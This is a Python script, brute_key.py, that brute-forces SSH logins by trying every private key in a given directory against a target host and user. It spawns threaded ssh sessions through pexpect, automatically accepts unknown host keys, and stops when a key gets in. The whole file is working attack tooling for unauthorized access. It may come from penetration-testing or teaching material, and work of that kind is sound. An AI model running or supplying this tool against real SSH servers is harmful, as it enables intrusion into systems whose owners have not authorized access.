'''
        brute forcing using ssh key

'''

import os
import sys
import argparse
import threading
import pexpect
# pylint: disable=C0413
sys.path.append(os.path.realpath('.'))
import vpconfig  # pylint: disable=E0401

connection_lock = threading.BoundedSemaphore(value=vpconfig.MAX_CONNECTIONS)


def connect(user, host, keyfile, release):
    ''' connect to the host'''
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT,
                            perm_denied,
                            ssh_newkey,
                            conn_closed,
                            '$',
                            '#'])
        if ret == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            vpconfig.FAILS += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            vpconfig.STOP = True
    finally:
        if release:
            connection_lock.release()


def main():
    ''' main function '''
    parser = argparse.ArgumentParser(usage='brute_key.py -H TARGET_HOST -u USER -d DIRECTORY')
    parser.add_argument('-H', dest='tgtHost', type=str, help='specify target host')
    parser.add_argument('-d', dest='passDir', type=str, help='specify directory with keys')
    parser.add_argument('-u', dest='user', type=str, help='specify the user')
    args = parser.parse_args()
    host = args.tgtHost
    passDir = args.passDir
    user = args.user
    if host is None or passDir is None or user is None:
        print(parser.usage)
        sys.exit(0)

    for filename in os.listdir(passDir):
        if vpconfig.STOP:
            print('[*] Exiting: Key Found.')
            sys.exit(0)
        if vpconfig.FAILS > 5:
            print('[!] Exiting: Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            sys.exit(0)
        connection_lock.acquire()  # pylint: disable=R1732
        fullpath = os.path.join(passDir, filename)
        print('[-] Testing keyfile ' + str(fullpath))
        t = threading.Thread(target=connect, args=(user, host, fullpath, True))
        t.start()


if __name__ == '__main__':
    main()
